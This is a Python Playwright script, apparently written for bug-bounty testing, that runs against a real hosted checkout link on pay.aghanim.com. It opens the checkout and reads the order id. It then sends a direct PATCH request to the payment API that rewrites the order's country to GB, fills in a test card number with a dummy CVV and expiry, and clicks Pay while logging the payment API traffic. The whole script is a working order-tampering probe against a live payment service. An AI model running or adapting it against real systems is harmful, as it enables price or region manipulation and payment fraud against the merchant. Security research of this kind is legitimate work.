import asyncio,json,re
from playwright.async_api import async_playwright
URL="https://pay.aghanim.com/link/lnk_eLmHjUeESltPUaRo?player_id=bb-buyer-1"
EMAIL="RESEARCHER_USERNAME+agh1@gmail.com"
async def main():
    async with async_playwright() as p:
        b=await p.chromium.launch(headless=True,args=["--no-sandbox"])
        ctx=await b.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",viewport={"width":430,"height":1000})
        pg=await ctx.new_page()
        log=[]
        pg.on("request",lambda r: log.append(("REQ",r.method,r.url,(r.post_data or "")[:300])) if "pay-api" in r.url else None)
        pg.on("response",lambda r: log.append(("RES",str(r.status),r.url,"")) if "pay-api" in r.url else None)
        await pg.goto(URL,wait_until="networkidle",timeout=60000)
        await pg.wait_for_timeout(3500)
        oid=re.search(r'/order/(ord_[A-Za-z0-9]+)',pg.url)
        print("order:",oid.group(1) if oid else None)
        if oid:
            r=await pg.evaluate("""async (oid)=>{const res=await fetch('https://pay-api.aghanim.com/order/v1/orders/'+oid,{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify({country:'GB'})});return res.status}""",oid.group(1))
            print("patch GB:",r)
            await pg.reload(wait_until="networkidle"); await pg.wait_for_timeout(3500)
        print("TEXT:",(await pg.inner_text("body"))[:300].replace("\n"," | "))
        try:
            await pg.fill('input[name="email"]',EMAIL)
            await pg.fill('input[name="cardNumber"]','4242424242424242')
            await pg.fill('input[name="expiryDate"]','12 / 30')
            await pg.fill('input[name="cvv"]','123')
            print("filled")
        except Exception as e: print("fill:",str(e)[:90])
        await pg.wait_for_timeout(1500)
        for sel in ['button:has-text("Pay £")','button:has-text("Pay $")','button:has-text("Pay ")']:
            try:
                await pg.click(sel,timeout=6000); print("clicked",sel); break
            except: pass
        await pg.wait_for_timeout(25000)
        print("FINAL:",pg.url)
        print("TEXT:",(await pg.inner_text("body"))[:300].replace("\n"," | "))
        for x in log[-8:]: print(" ",x[0],x[1],x[2][:95],x[3][:120])
        await b.close()
asyncio.run(main())
